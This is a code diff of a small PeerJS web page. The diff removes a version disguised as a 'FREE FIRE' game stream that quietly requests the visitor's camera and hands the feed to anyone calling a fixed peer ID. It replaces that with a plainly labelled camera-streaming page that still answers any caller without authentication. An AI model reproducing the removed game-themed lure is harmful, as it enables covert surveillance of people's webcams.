@@ -1,58 +1,32 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Free Fire Stream</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #8e2de2, #4a00e0);
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-    }
-
-    h1 {
-      font-size: 3rem;
-      margin-bottom: 20px;
-      animation: glow 2s ease-in-out infinite alternate;
-    }
-
-    @keyframes glow {
-      from { text-shadow: 0 0 10px #fff, 0 0 20px #fff; }
-      to { text-shadow: 0 0 20px #ff00ff, 0 0 30px #ff00ff; }
-    }
-
-    video {
-      width: 90%;
-      max-width: 400px;
-      margin: 10px;
-      border: 3px solid #fff;
-      border-radius: 10px;
-      box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
-    }
-  </style>
+  <title>Stream</title>
 </head>
 <body>
-  <h1>FREE FIRE</h1>
+  <h1>Camera đang phát</h1>
   <video id="localVideo" autoplay muted playsinline></video>
 
-  <!-- PeerJS CDN -->
   <script src="https://cdn.jsdelivr.net/npm/peerjs@1.5.2/dist/peerjs.min.js"></script>
-  <!-- Mã JavaScript chính -->
-  <script src="main.js"></script>
   <script>
-const peer = new Peer("test-id");
-peer.on("open", () => {
-  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-    peer.on("call", call => call.answer(stream));
-  });
-});
-</script>
+    const peer = new Peer("my-fixed-id");
+
+    peer.on("open", id => {
+      console.log("🔴 Đang phát với ID:", id);
+
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(stream => {
+          document.getElementById("localVideo").srcObject = stream;
+
+          peer.on("call", call => {
+            call.answer(stream);
+          });
+        })
+        .catch(err => {
+          alert("❌ Không thể truy cập camera: " + err.message);
+        });
+    });
+  </script>
 </body>
 </html>
